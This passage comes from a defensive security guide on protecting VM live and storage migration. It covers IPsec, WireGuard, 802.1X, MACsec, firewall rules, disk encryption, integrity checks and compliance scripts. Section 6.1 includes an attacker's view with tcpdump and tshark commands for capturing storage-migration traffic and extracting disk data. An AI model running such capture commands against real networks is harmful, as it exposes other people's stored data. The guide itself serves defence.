                rekey_bytes = 107374182400
                
                # Force tunnel mode
                mode = tunnel
                
                # Start immediately
                start_action = start
                close_action = start
                dpd_action = restart
                
                # Mark for policy routing
                mark_in = 100
                mark_out = 100
            }
        }
        
        # IKEv2 proposals
        proposals = aes256-sha384-x25519
        
        # Rekey IKE SA every 4 hours
        rekey_time = 14400
    }
}

# Repeat for each node pair (full mesh for N nodes)
```

**Load and activate:**

```bash
# Load configuration
swanctl --load-all

# Verify tunnel establishment
swanctl --list-sas

# Expected output:
# migration-tunnel: #1, ESTABLISHED, IKEv2
#   local  'CN=pve01.migration.local' @ 10.200.0.11
#   remote 'CN=pve02.migration.local' @ 10.200.0.12
#   migration-traffic: #1, INSTALLED, TUNNEL, ESP:AES_GCM_16-256
#     10.200.0.11/32 === 10.200.0.12/32

# Monitor throughput during migration
swanctl --stats
```

### 5.2 WireGuard Overlay for Migration

WireGuard provides a simpler alternative to IPsec with excellent performance characteristics:

```bash
# Install WireGuard on each Proxmox node
apt install wireguard-tools

# Generate key pairs on each node
wg genkey | tee /etc/wireguard/migration_private.key | wg pubkey > /etc/wireguard/migration_public.key
chmod 600 /etc/wireguard/migration_private.key

# Node 01: /etc/wireguard/wg-migration.conf
[Interface]
PrivateKey = <NODE01_PRIVATE_KEY>
Address = 10.201.0.1/24
ListenPort = 51821
# Bind to migration physical interface only
# This prevents WireGuard from using production interfaces
Table = off
PostUp = ip route add 10.201.0.0/24 dev %i metric 100
PostDown = ip route del 10.201.0.0/24 dev %i

[Peer]
# Node 02
PublicKey = <NODE02_PUBLIC_KEY>
AllowedIPs = 10.201.0.2/32
Endpoint = 10.200.0.12:51821
PersistentKeepalive = 25

[Peer]
# Node 03
PublicKey = <NODE03_PUBLIC_KEY>
AllowedIPs = 10.201.0.3/32
Endpoint = 10.200.0.13:51821
PersistentKeepalive = 25
```

```bash
# Activate WireGuard interface
systemctl enable --now wg-quick@wg-migration

# Verify connectivity
wg show wg-migration

# Configure Proxmox to use WireGuard addresses for migration
# /etc/pve/datacenter.cfg
migration: secure,network=10.201.0.0/24
```

### 5.3 802.1X on Migration Ports

802.1X provides port-based network access control, preventing unauthorized devices from connecting to the migration network:

```
# Cisco IOS switch configuration for migration VLAN ports
interface GigabitEthernet1/0/10
 description MIGRATION-PVE01
 switchport mode access
 switchport access vlan 200
 dot1x port-control auto
 dot1x authentication-order eap
 dot1x authentication-type eap-tls
 authentication timer reauthenticate 3600
 spanning-tree portfast
 storm-control broadcast level 1.0
 storm-control multicast level 1.0
 no cdp enable
 no lldp transmit

! RADIUS server for 802.1X
radius-server host 10.10.0.50 auth-port 1812 acct-port 1813
 key 7 <ENCRYPTED_KEY>
aaa authentication dot1x default group radius
aaa authorization network default group radius
```

**FreeRADIUS configuration for EAP-TLS on migration ports:**

```bash
# /etc/freeradius/3.0/sites-available/migration
server migration {
    listen {
        type = auth
        ipaddr = 10.10.0.50
        port = 1812
    }
    
    authorize {
        eap {
            default_eap_type = tls
        }
    }
    
    authenticate {
        eap
    }
}

# /etc/freeradius/3.0/mods-available/eap (migration-specific)
eap {
    default_eap_type = tls
    tls-config tls-migration {
        private_key_file = /etc/freeradius/certs/migration-radius.key
        certificate_file = /etc/freeradius/certs/migration-radius.pem
        ca_file = /etc/freeradius/certs/migration-ca.pem
        
        # Only accept certificates with migration OU
        check_cert_cn = %{User-Name}
        verify {
            # Custom script to verify cert OU = "migration-hosts"
            tmpdir = /tmp/radiusd
            client = "/usr/local/bin/verify_migration_cert.sh %{TLS-Client-Cert-Filename}"
        }
    }
}
```

### 5.4 MACsec for L2 Encryption

MACsec (802.1AE) encrypts at Layer 2 — providing hop-by-hop encryption on the migration segment:

```bash
# Configure MACsec on Proxmox node (Linux kernel MACsec)
# Requires: switch support for MACsec (Cisco Catalyst 9K, Arista 7050X, etc.)

# Create MACsec interface
ip link add link ens1f1 macsec0 type macsec sci 1 encrypt on

# Add transmit key (CAK/CKN from 802.1X MKA or static)
# Static key example (for testing — use MKA in production):
ip macsec add macsec0 tx sa 0 pn 1 on \
    key 01 deca0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f

ip macsec add macsec0 rx sci 0x0050568a0001 sa 0 pn 1 on \
    key 01 deca0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f

# Bring up MACsec interface
ip link set macsec0 up
ip addr add 10.200.0.11/24 dev macsec0

# Verify MACsec status
ip macsec show
```

### 5.5 Microsegmentation of Migration Plane

**nftables rules for migration host firewall:**

```bash
#!/usr/sbin/nft -f
# /etc/nftables.d/migration.conf
# Strict firewall for migration interface

table inet migration_security {
    # Define migration network hosts
    set migration_hosts {
        type ipv4_addr
        flags interval
        elements = {
            10.200.0.11,  # pve01
            10.200.0.12,  # pve02
            10.200.0.13,  # pve03
            10.200.0.14   # pve04
        }
    }

    chain migration_input {
        type filter hook input priority filter; policy drop;
        
        # Allow established/related
        ct state established,related accept
        
        # Allow SSH from migration peers only (for tunneled migration)
        iifname "vmbr1" ip saddr @migration_hosts tcp dport 22 accept
        
        # Allow QEMU migration ports (if using non-tunneled for specific case)
        # iifname "vmbr1" ip saddr @migration_hosts tcp dport 49152-49215 accept
        
        # Allow WireGuard (if using WireGuard overlay)
        iifname "vmbr1" ip saddr @migration_hosts udp dport 51821 accept
        
        # Allow IPsec (if using strongSwan)
        iifname "vmbr1" ip saddr @migration_hosts ip protocol esp accept
        iifname "vmbr1" ip saddr @migration_hosts udp dport {500, 4500} accept
        
        # DENY everything else on migration interface
        iifname "vmbr1" counter drop
        
        # Log dropped packets for forensics
        iifname "vmbr1" log prefix "MIGRATION_DROP: " counter drop
    }

    chain migration_output {
        type filter hook output priority filter; policy drop;
        
        ct state established,related accept
        
        # Only allow migration traffic to known peers
        oifname "vmbr1" ip daddr @migration_hosts tcp dport 22 accept
        oifname "vmbr1" ip daddr @migration_hosts udp dport 51821 accept
        oifname "vmbr1" ip daddr @migration_hosts ip protocol esp accept
        oifname "vmbr1" ip daddr @migration_hosts udp dport {500, 4500} accept
        
        oifname "vmbr1" counter drop
    }

    chain migration_forward {
        type filter hook forward priority filter; policy drop;
        
        # NEVER forward traffic through migration interface
        iifname "vmbr1" counter drop
        oifname "vmbr1" counter drop
    }
}
```

**iptables equivalent (for legacy systems):**

```bash
#!/bin/bash
# Migration interface firewall — iptables version

MIGRATION_IF="vmbr1"
MIGRATION_PEERS="10.200.0.11 10.200.0.12 10.200.0.13 10.200.0.14"

# Flush existing rules for migration chain
iptables -N MIGRATION_IN 2>/dev/null || iptables -F MIGRATION_IN
iptables -N MIGRATION_OUT 2>/dev/null || iptables -F MIGRATION_OUT

# Default deny on migration interface
iptables -A INPUT -i $MIGRATION_IF -j MIGRATION_IN
iptables -A OUTPUT -o $MIGRATION_IF -j MIGRATION_OUT

# Allow established connections
iptables -A MIGRATION_IN -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A MIGRATION_OUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH from peers only
for PEER in $MIGRATION_PEERS; do
    iptables -A MIGRATION_IN -s $PEER -p tcp --dport 22 -j ACCEPT
    iptables -A MIGRATION_OUT -d $PEER -p tcp --dport 22 -j ACCEPT
done

# Allow IPsec
for PEER in $MIGRATION_PEERS; do
    iptables -A MIGRATION_IN -s $PEER -p esp -j ACCEPT
    iptables -A MIGRATION_IN -s $PEER -p udp --dport 500 -j ACCEPT
    iptables -A MIGRATION_IN -s $PEER -p udp --dport 4500 -j ACCEPT
    iptables -A MIGRATION_OUT -d $PEER -p esp -j ACCEPT
    iptables -A MIGRATION_OUT -d $PEER -p udp --dport 500 -j ACCEPT
    iptables -A MIGRATION_OUT -d $PEER -p udp --dport 4500 -j ACCEPT
done

# Drop and log everything else
iptables -A MIGRATION_IN -j LOG --log-prefix "MIG_DROP_IN: "
iptables -A MIGRATION_IN -j DROP
iptables -A MIGRATION_OUT -j LOG --log-prefix "MIG_DROP_OUT: "
iptables -A MIGRATION_OUT -j DROP

# Block ALL forwarding through migration interface
iptables -A FORWARD -i $MIGRATION_IF -j DROP
iptables -A FORWARD -o $MIGRATION_IF -j DROP
```

---

## 6. Storage Migration Security

### 6.1 Storage vMotion Data Exposure

Storage vMotion (VMware) or offline storage migration (Proxmox) transfers the complete virtual disk between datastores. Unlike live memory migration, this involves the full persistent state of the VM:

**Exposure during storage migration:**

| Data Type | Volume | Risk |
|---|---|---|
| VM disk contents (VMDK/qcow2/raw) | Entire disk (potentially TB) | Complete data exposure |
| Snapshots and deltas | All snapshot chains | Historical state exposure |
| Swap files (.vswp) | Matches VM RAM allocation | Memory paged to disk |
| VM logs and metadata | Small but sensitive | Operational intelligence |
| NVRAM/EFI vars | Small | Boot-level secrets, Secure Boot state |

**Attack scenario: VMDK transfer interception**

```bash
# Storage vMotion transfers over NFC (Network File Copy) protocol
# Default port: TCP 902 (ESXi NFC) or datastore-specific port
# On NFS datastores: traffic uses NFS protocol (TCP 2049)

# Attacker capturing NFS-based storage migration:
tcpdump -i eth0 -nn -w storage_migration.pcap \
    'tcp port 2049 and host 10.100.0.20'

# For iSCSI-based storage:
tcpdump -i eth0 -nn -w iscsi_capture.pcap \
    'tcp port 3260'

# Reconstruct VMDK from NFS capture (conceptual):
# NFS write operations contain disk block data
tshark -r storage_migration.pcap \
    -Y "nfs.procedure_v3 == WRITE" \
    -T fields -e nfs.fh.hash -e data.data > nfs_writes.txt
```

### 6.2 Encrypted Storage Backends

**LUKS encryption for Proxmox local storage:**

```bash
# Create LUKS-encrypted LVM for VM storage
cryptsetup luksFormat --type luks2 \
    --cipher aes-xts-plain64 \
    --key-size 512 \
    --hash sha512 \
    --iter-time 5000 \
    --pbkdf argon2id \
    /dev/sdb1

# Open encrypted volume
cryptsetup luksOpen /dev/sdb1 crypt-vmstore

# Create LVM on encrypted device
pvcreate /dev/mapper/crypt-vmstore
vgcreate vg-secure /dev/mapper/crypt-vmstore
lvcreate -l 100%FREE -n vm-data vg-secure

# Format and mount
mkfs.ext4 /dev/vg-secure/vm-data
mkdir -p /mnt/secure-vmstore
mount /dev/vg-secure/vm-data /mnt/secure-vmstore

# Add to Proxmox as storage
pvesm add dir secure-store --path /mnt/secure-vmstore --content images,rootdir

# Auto-unlock with TPM2 (requires systemd-cryptenroll)
systemd-cryptenroll --tpm2-device=auto --tpm2-pcrs=0+1+2+3+7 /dev/sdb1
```

**ZFS native encryption:**

```bash
# Create encrypted ZFS pool for VM storage
zpool create -o ashift=12 \
    -O encryption=aes-256-gcm \
    -O keyformat=passphrase \
    -O keylocation=file:///etc/zfs/keys/vmstore.key \
    -O compression=lz4 \
    -O atime=off \
    tank-secure /dev/sdc

# Or use raw key for automated unlocking:
dd if=/dev/urandom of=/etc/zfs/keys/vmstore.key bs=32 count=1
chmod 600 /etc/zfs/keys/vmstore.key

zpool create -o ashift=12 \
    -O encryption=aes-256-gcm \
    -O keyformat=raw \
    -O keylocation=file:///etc/zfs/keys/vmstore.key \
    tank-secure /dev/sdc

# Create dataset for VMs
zfs create tank-secure/vm-disks

# Add to Proxmox
pvesm add zfspool secure-zfs --pool tank-secure/vm-disks --content images,rootdir

# Verify encryption status
zfs get encryption,keystatus tank-secure
# Expected: encryption=aes-256-gcm, keystatus=available
```

**vSAN encryption (VMware):**

```
# PowerCLI: Enable vSAN encryption (requires KMS configured in vCenter)
$cluster = Get-Cluster -Name "Production"
$vsanConfig = Get-VsanClusterConfiguration -Cluster $cluster

# Enable data-at-rest encryption
Set-VsanClusterConfiguration -Configuration $vsanConfig `
    -EncryptionEnabled $true `
    -KmsCluster "HQ-KMS-Cluster"

# Enable data-in-transit encryption for vSAN
Set-VsanClusterConfiguration -Configuration $vsanConfig `
    -DataInTransitEncryptionEnabled $true

# Verify encryption status
Get-VsanClusterConfiguration -Cluster $cluster |
    Select-Object EncryptionEnabled, DataInTransitEncryptionEnabled,
                  KmsClusterId, EncryptionHealthStatus
```

### 6.3 Integrity Verification Post-Migration

**Checksum verification for migrated disks:**

```bash
#!/bin/bash
# post_migration_integrity.sh
# Verify VM disk integrity after storage migration

VM_ID=$1
EXPECTED_CHECKSUM_FILE="/var/lib/migration-checksums/${VM_ID}.sha256"

if [ -z "$VM_ID" ]; then
    echo "Usage: $0 <VM_ID>"
    exit 1
fi

# Get disk path for the VM
DISK_PATH=$(qm config "$VM_ID" | grep -oP '(?<=file=)\S+' | head -1)
ACTUAL_DISK="/dev/zvol/rpool/data/vm-${VM_ID}-disk-0"

if [ -f "$ACTUAL_DISK" ]; then
    DISK_TO_CHECK="$ACTUAL_DISK"
elif [ -f "/var/lib/vz/images/${VM_ID}/"*.qcow2 ]; then
    DISK_TO_CHECK="/var/lib/vz/images/${VM_ID}/"*.qcow2
else
    echo "[ERROR] Cannot locate disk for VM $VM_ID"
    exit 2
fi

echo "[*] Computing SHA-256 for VM $VM_ID disk: $DISK_TO_CHECK"
CURRENT_HASH=$(sha256sum "$DISK_TO_CHECK" | awk '{print $1}')

if [ -f "$EXPECTED_CHECKSUM_FILE" ]; then
    EXPECTED_HASH=$(cat "$EXPECTED_CHECKSUM_FILE")
    if [ "$CURRENT_HASH" = "$EXPECTED_HASH" ]; then
        echo "[OK] Integrity verified — checksum matches"
        logger -t migration-integrity "VM $VM_ID: integrity OK post-migration"
    else
        echo "[CRITICAL] INTEGRITY FAILURE — checksum mismatch!"
        echo "  Expected: $EXPECTED_HASH"
        echo "  Actual:   $CURRENT_HASH"
        logger -p auth.crit -t migration-integrity \
            "VM $VM_ID: INTEGRITY FAILURE post-migration"
        # Alert SOC
        # curl -X POST https://siem.internal/api/alert ...
        exit 3
    fi
else
    echo "[WARN] No baseline checksum found. Storing current hash."
    mkdir -p "$(dirname "$EXPECTED_CHECKSUM_FILE")"
    echo "$CURRENT_HASH" > "$EXPECTED_CHECKSUM_FILE"
fi
```

**Pre-migration checksum capture (integrate into migration workflow):**

```bash
#!/bin/bash
# pre_migration_checksum.sh — Run BEFORE initiating migration
# Creates integrity baseline

VM_ID=$1
CHECKSUM_DIR="/var/lib/migration-checksums"

mkdir -p "$CHECKSUM_DIR"

# For qcow2 files
DISK=$(find /var/lib/vz/images/"$VM_ID"/ -name "*.qcow2" 2>/dev/null | head -1)

# For ZFS volumes
[ -z "$DISK" ] && DISK="/dev/zvol/rpool/data/vm-${VM_ID}-disk-0"

if [ -e "$DISK" ]; then
    sha256sum "$DISK" | awk '{print $1}' > "${CHECKSUM_DIR}/${VM_ID}.sha256"
    echo "[OK] Baseline checksum stored for VM $VM_ID"
else
    echo "[ERROR] Disk not found for VM $VM_ID"
    exit 1
fi
```

### 6.4 Data Remanence on Source After Migration

After a VM migrates, its data may persist on the source storage in various forms:

1. **Deleted disk files:** Filesystem deletion does not overwrite data blocks.
2. **Snapshot residue:** Delta files from snapshots may remain.
3. **Swap/page files:** .vswp files or swap partitions retain memory contents.
4. **Journal entries:** Filesystem journals contain fragments of written data.
5. **SSD wear-leveling blocks:** Even after TRIM, old data may exist in over-provisioned space.

**Secure erasure after migration:**

```bash
#!/bin/bash
# secure_wipe_post_migration.sh
# Securely erase source storage after confirmed migration

VM_ID=$1
SOURCE_PATH="/var/lib/vz/images/${VM_ID}"

# Verify VM is running on destination (not source)
RUNNING_NODE=$(pvesh get /cluster/resources --type vm 2>/dev/null | \
    jq -r ".[] | select(.vmid == $VM_ID and .status == \"running\") | .node")

if [ "$RUNNING_NODE" = "$(hostname)" ]; then
    echo "[ERROR] VM $VM_ID is still running on this node. Aborting wipe."
    exit 1
fi

if [ -d "$SOURCE_PATH" ]; then
    echo "[*] Secure wiping source storage for VM $VM_ID"
    
    # Overwrite with random data before deletion
    for disk_file in "$SOURCE_PATH"/*; do
        if [ -f "$disk_file" ]; then
            SIZE=$(stat -c%s "$disk_file")
            echo "[*] Wiping: $disk_file ($SIZE bytes)"
            dd if=/dev/urandom of="$disk_file" bs=1M count=$((SIZE/1048576 + 1)) \
                conv=notrunc status=progress 2>/dev/null
            sync
            rm -f "$disk_file"
        fi
    done
    
    rmdir "$SOURCE_PATH" 2>/dev/null
    echo "[OK] Source storage securely wiped"
    logger -t migration-wipe "VM $VM_ID: source storage securely wiped"
    
    # For ZFS: destroy the zvol (inherently overwrites on next use with encryption)
    # zfs destroy rpool/data/vm-${VM_ID}-disk-0
    
    # Issue TRIM to SSD to mark blocks as unused
    fstrim -v /var/lib/vz/
fi
```

---

## 7. Cross-Cluster and Cross-Site Migration

### 7.1 WAN Migration Challenges

Cross-site migration introduces fundamentally different security challenges compared to local migration:

| Challenge | Local Migration | Cross-Site Migration |
|---|---|---|
| Network trust | Private L2, physical security | Traverses WAN/Internet, multiple ASes |
| Latency | <1ms | 5-100ms+ (affects migration convergence) |
| Bandwidth | 10-100 Gbps dedicated | 1-10 Gbps shared WAN |
| Interception risk | Requires physical access | Multiple intermediate routers/ISPs |
| Certificate trust | Single CA, same domain | Cross-domain CA trust, federation |
| Regulatory | Same jurisdiction | Potentially cross-border (GDPR) |

**Latency and timeout exploitation:**

An attacker can exploit high-latency WAN links to:

1. **Extend migration window:** Inject latency (route manipulation, TCP RST injection) to keep the migration in pre-copy phase longer, maximizing the exposure window.
2. **Force migration failure:** Cause enough packet loss to exceed timeout, potentially leaving the VM in an inconsistent state.
3. **Trigger split-brain:** If migration completes on destination but confirmation is lost, both source and destination may attempt to run the VM simultaneously.

### 7.2 VMware Cross-vCenter Migration (xMotion) and HCX

**xMotion security considerations:**

```
# PowerCLI: Configure cross-vCenter vMotion with encryption
# Both vCenters must be in Enhanced Linked Mode or have trust established

# Step 1: Export/Import vCenter certificates for mutual trust
# On source vCenter:
Get-VITrustedPrincipal | Where-Object { $_.Name -like "*destination*" }

# Step 2: Configure encrypted cross-vCenter migration
$vm = Get-VM -Name "Critical-VM"
$destHost = Get-VMHost -Name "esxi-remote01.site2.corp" -Server $destVCenter
$destDatastore = Get-Datastore -Name "SSD-Tier1" -Server $destVCenter
$destPortgroup = Get-VDPortgroup -Name "Prod-VLAN100" -Server $destVCenter

# Verify encryption will be applied
$vm.ExtensionData.Config.MigrateEncryption  # Should be "required"

# Execute cross-vCenter migration
Move-VM -VM $vm -Destination $destHost `
    -Datastore $destDatastore `
    -PortGroup $destPortgroup `
    -NetworkAdapter (Get-NetworkAdapter -VM $vm) `
    -VMotionPriority "High"
```

**HCX (Hybrid Cloud Extension) security:**

VMware HCX is commonly used for large-scale migrations and hybrid cloud mobility. Its security architecture:

```
# HCX tunnel components:
# 1. IX (Interconnect) - Management plane (TCP 443)
# 2. WO (WAN Optimization) - Data plane (UDP 4500)  
# 3. NE (Network Extension) - L2 stretch (UDP 4500)

# Security configuration for HCX:
# - Mutual TLS between HCX appliances
# - IPsec ESP for data plane (AES-256-GCM)
# - Certificate-based authentication (no shared keys)

# Verify HCX tunnel encryption:
# On HCX Manager appliance:
hcx-cli tunnel status
hcx-cli security show-certificates
hcx-cli security show-ipsec-sa

# HCX firewall requirements (minimum ports):
# Source Site → Destination Site:
#   TCP 443  (Management, TLS 1.2+)
#   UDP 4500 (IPsec NAT-T for data plane)
#   TCP 8000 (vMotion, encrypted by HCX)
#   TCP 902  (NFC for storage, encrypted by HCX)
```

### 7.3 VPN/MPLS Requirements for Cross-Site Migration

**Site-to-site VPN architecture for migration:**

```bash
# strongSwan site-to-site for migration traffic
# /etc/swanctl/swanctl.conf — Site A gateway

connections {
    site-to-site-migration {
        version = 2
        
        local_addrs = 203.0.113.10   # Public IP Site A
        remote_addrs = 198.51.100.20  # Public IP Site B
        
        local {
            auth = pubkey
            certs = siteA-gw.pem
        }
        remote {
            auth = pubkey
            certs = siteB-gw.pem
        }
        
        children {
            migration-net {
                # Only encrypt migration subnet traffic
                local_ts = 10.200.0.0/24   # Site A migration network
                remote_ts = 10.200.1.0/24   # Site B migration network
                
                esp_proposals = aes256gcm16-chacha20poly1305-x25519-ke1_kyber3
                
                # Anti-replay protection
                replay_window = 1024
                
                # Perfect forward secrecy
                rekey_time = 1800
                
                dpd_action = restart
                start_action = start
            }
        }
        
        # Post-quantum hybrid key exchange (strongSwan 6.0+)
        proposals = aes256-sha384-x25519-ke1_kyber3
    }
}
```

### 7.4 Certificate Validation Across Sites

```bash
# Cross-site certificate trust for Proxmox clusters
# Each site has its own cluster CA. For cross-cluster migration,
# establish mutual trust:

# Site A: Export cluster CA
cp /etc/pve/pve-root-ca.pem /tmp/siteA-ca.pem

# Site B: Import Site A's CA as trusted
mkdir -p /etc/pve/trusted-certs/
cp siteA-ca.pem /etc/pve/trusted-certs/
update-ca-certificates

# Verify trust chain
openssl verify -CAfile /etc/pve/trusted-certs/siteA-ca.pem \
    /tmp/node-siteA-cert.pem

# For automated cross-cluster migration, configure SSH trust:
# On Site B nodes, add Site A host keys
ssh-keyscan -H pve01-siteA.corp >> /root/.ssh/known_hosts
ssh-keyscan -H pve02-siteA.corp >> /root/.ssh/known_hosts

# Use certificate-based SSH authentication (recommended over keys):
# /etc/ssh/sshd_config on all migration nodes
TrustedUserCAKeys /etc/ssh/migration-ca.pub
AuthorizedPrincipalsFile /etc/ssh/authorized_principals

# /etc/ssh/authorized_principals
migration-service
```

### 7.5 Disaster Recovery Migration Security

DR failover migrations have unique security challenges:

1. **Reduced validation:** Time pressure during DR events may lead to bypassing security checks.
2. **Stale credentials:** If primary site is compromised, credentials used for DR migration may also be compromised.
3. **Break-glass procedures:** Emergency access must be pre-planned, audited, and time-limited.

```bash
#!/bin/bash
# dr_migration_security_check.sh
# Pre-flight security validation before DR migration

echo "=== DR Migration Security Pre-Flight ==="
echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

FAILURES=0

# 1. Verify VPN/IPsec tunnel is up
if ! swanctl --list-sas | grep -q "ESTABLISHED"; then
    echo "[FAIL] IPsec tunnel not established"
    FAILURES=$((FAILURES + 1))
else
    echo "[OK] IPsec tunnel active"
fi

# 2. Verify destination cluster is reachable and authenticated
if ! pvesh get /cluster/status --output-format json 2>/dev/null | jq -e '.' >/dev/null; then
    echo "[FAIL] Cannot authenticate to cluster"
    FAILURES=$((FAILURES + 1))
else
    echo "[OK] Cluster authentication valid"
fi

# 3. Verify migration encryption is enforced
MIGRATION_TYPE=$(grep "^migration:" /etc/pve/datacenter.cfg | awk '{print $2}')
if [[ "$MIGRATION_TYPE" != *"secure"* ]]; then
    echo "[FAIL] Migration encryption not set to 'secure'"
    FAILURES=$((FAILURES + 1))
else
    echo "[OK] Migration encryption enforced"
fi

# 4. Check certificate expiry
CERT_EXPIRY=$(openssl x509 -in /etc/pve/local/pve-ssl.pem -noout -enddate | cut -d= -f2)
EXPIRY_EPOCH=$(date -d "$CERT_EXPIRY" +%s)
NOW_EPOCH=$(date +%s)
DAYS_LEFT=$(( (EXPIRY_EPOCH - NOW_EPOCH) / 86400 ))

if [ "$DAYS_LEFT" -lt 7 ]; then
    echo "[WARN] Certificate expires in $DAYS_LEFT days"
    FAILURES=$((FAILURES + 1))
else
    echo "[OK] Certificate valid for $DAYS_LEFT days"
fi

# 5. Verify firewall rules are active
if ! nft list ruleset | grep -q "migration_security"; then
    echo "[FAIL] Migration firewall rules not loaded"
    FAILURES=$((FAILURES + 1))
else
    echo "[OK] Migration firewall active"
fi

echo ""
echo "=== Result: $FAILURES failure(s) ==="
if [ "$FAILURES" -gt 0 ]; then
    echo "[BLOCK] Fix security issues before proceeding with DR migration"
    exit 1
fi
echo "[PASS] DR migration security pre-flight complete"
exit 0
```

---

## 8. Compliance and Audit

### 8.1 PCI-DSS Requirements for VM Mobility

PCI-DSS v4.0 has specific implications for live migration in environments processing cardholder data (CHD):

**Requirement 1: Network segmentation**

Live migration must not bridge network segments. A VM migrating between hosts must maintain its network isolation:

```bash
# Verify: Migration does not change VM network assignment
# Post-migration validation script

VM_ID=$1
EXPECTED_VLAN=100  # PCI CDE VLAN

# Get current network assignment
CURRENT_NET=$(qm config "$VM_ID" | grep "^net0:" | grep -oP 'tag=\K[0-9]+')

if [ "$CURRENT_NET" != "$EXPECTED_VLAN" ]; then
    echo "[PCI VIOLATION] VM $VM_ID network changed during migration!"
    echo "  Expected VLAN: $EXPECTED_VLAN"
    echo "  Current VLAN:  $CURRENT_NET"
    # Immediate remediation: isolate VM
    qm set "$VM_ID" --net0 virtio,bridge=vmbr0,tag=$EXPECTED_VLAN
    logger -p auth.crit -t pci-compliance \
        "VM $VM_ID network segmentation violation during migration"
fi
```

**Requirement 4: Encrypt transmission of cardholder data**

Migration of VMs containing CHD requires encrypted transit:

| PCI-DSS Requirement | Migration Implication | Evidence Required |
|---|---|---|
| 4.2.1 Strong cryptography for CHD in transit | Migration stream must be encrypted | Config showing encryption=required |
| 1.2.1 Network segmentation | Migration must not bridge CDE/non-CDE | Network diagrams, VLAN configs |
| 10.2.1 Audit trails | All migrations must be logged | vCenter/Proxmox audit logs |
| 11.4 Monitor unauthorized access | Detect unauthorized migrations | SIEM rules, alerting |
| 12.5.2 Incident response | Migration failures need IR procedure | Runbooks |

### 8.2 HIPAA Considerations for PHI in Memory

HIPAA's Security Rule (45 CFR 164.312) requires transmission security for ePHI:

**Key concern:** During live migration, PHI loaded into VM memory traverses the network. This constitutes "transmission" under HIPAA.

```yaml
# HIPAA migration controls documentation
# Document as part of risk assessment (45 CFR 164.308(a)(1)(ii)(A))

hipaa_migration_controls:
  transmission_security:
    encryption: "AES-256-GCM via vMotion encryption (required mode)"
    integrity: "GCM authentication tag provides integrity verification"
    protocol: "SSH tunnel (Proxmox) / Encrypted vMotion (VMware)"
    
  access_controls:
    migration_authorization: "Only Infrastructure Admins (IAM group)"
    mfa_required: true
    api_token_scope: "VM.Migrate only, no VM.Console"
    
  audit_controls:
    log_retention: "6 years minimum (HIPAA requirement)"
    log_content: "Timestamp, operator, source, destination, VM ID, encryption status"
    
  integrity_controls:
    pre_migration_hash: true
    post_migration_verification: true
    rollback_procedure: "Documented in IR-PLAN-007"
```

### 8.3 SOC 2 Evidence: Migration Logs and Encryption Proof

SOC 2 Type II requires demonstrating that controls operate effectively over time. For migration security:

**Evidence collection script:**

```bash
#!/bin/bash
# soc2_migration_evidence.sh
# Collect SOC 2 evidence for migration security controls
# Run monthly as part of continuous compliance

EVIDENCE_DIR="/var/log/compliance/soc2/$(date +%Y-%m)"
mkdir -p "$EVIDENCE_DIR"

echo "=== SOC 2 Migration Security Evidence Collection ==="
echo "Period: $(date +%Y-%m)"
echo "Collected: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

# CC6.1: Encryption of data in transit
echo "--- CC6.1: Migration Encryption Configuration ---" > "$EVIDENCE_DIR/cc6.1-encryption.txt"
grep "^migration:" /etc/pve/datacenter.cfg >> "$EVIDENCE_DIR/cc6.1-encryption.txt"
# Should show "secure" mode

# Capture SSH cipher configuration
echo "SSH Ciphers:" >> "$EVIDENCE_DIR/cc6.1-encryption.txt"
grep -E "^Ciphers|^MACs|^KexAlgorithms" /etc/ssh/sshd_config >> "$EVIDENCE_DIR/cc6.1-encryption.txt"

# CC6.6: Logical access controls
echo "--- CC6.6: Migration Authorization ---" > "$EVIDENCE_DIR/cc6.6-access.txt"
pveum role list | grep -A5 "Migration" >> "$EVIDENCE_DIR/cc6.6-access.txt"
pveum user list --full >> "$EVIDENCE_DIR/cc6.6-access.txt"

# CC7.2: Monitoring
echo "--- CC7.2: Migration Event Monitoring ---" > "$EVIDENCE_DIR/cc7.2-monitoring.txt"
# Extract migration events from last 30 days
journalctl --since "30 days ago" -u pvedaemon --no-pager | \
    grep -i "migrat" >> "$EVIDENCE_DIR/cc7.2-monitoring.txt"

# Count migrations and verify all were encrypted
TOTAL_MIGRATIONS=$(grep -c "migrate" "$EVIDENCE_DIR/cc7.2-monitoring.txt" || echo 0)
echo "Total migrations in period: $TOTAL_MIGRATIONS" >> "$EVIDENCE_DIR/cc7.2-monitoring.txt"

# CC7.3: Incident detection
echo "--- CC7.3: Unauthorized Migration Alerts ---" > "$EVIDENCE_DIR/cc7.3-incidents.txt"
grep "MIGRATION_DROP" /var/log/syslog* 2>/dev/null >> "$EVIDENCE_DIR/cc7.3-incidents.txt"
grep "unauthorized.*migrat" /var/log/syslog* 2>/dev/null >> "$EVIDENCE_DIR/cc7.3-incidents.txt"

# Sign evidence package
tar czf "$EVIDENCE_DIR.tar.gz" "$EVIDENCE_DIR/"
sha256sum "$EVIDENCE_DIR.tar.gz" > "$EVIDENCE_DIR.tar.gz.sha256"

echo "Evidence collected in: $EVIDENCE_DIR"
echo "Package hash: $(cat "$EVIDENCE_DIR.tar.gz.sha256")"
```

### 8.4 GDPR Data Residency and Cross-Border Migration

GDPR Article 44-49 restricts transfer of personal data outside the EEA. Live migration that crosses borders constitutes a data transfer.

**Technical controls for GDPR migration compliance:**

```bash
# Enforce geographic migration boundaries in Proxmox
# Use migration policies based on node location tags

# /etc/pve/datacenter.cfg — define allowed migration targets
# (Custom implementation via hook scripts)

# Pre-migration hook to enforce GDPR boundaries
# /var/lib/pve/hooks/pre-migrate.sh
#!/bin/bash

VM_ID=$1
SOURCE_NODE=$2
DEST_NODE=$3

# Node-to-region mapping
declare -A NODE_REGION
NODE_REGION[pve01-fra]=EU
NODE_REGION[pve02-fra]=EU
NODE_REGION[pve03-ams]=EU
NODE_REGION[pve04-lon]=UK   # Post-Brexit: UK adequacy decision
NODE_REGION[pve05-nyc]=US
NODE_REGION[pve06-sgp]=APAC

# VM data classification
VM_CLASS=$(qm config "$VM_ID" | grep "^description:" | grep -oP 'gdpr-class=\K\w+')

SOURCE_REGION=${NODE_REGION[$SOURCE_NODE]}
DEST_REGION=${NODE_REGION[$DEST_NODE]}

if [ "$VM_CLASS" = "eu-personal-data" ]; then
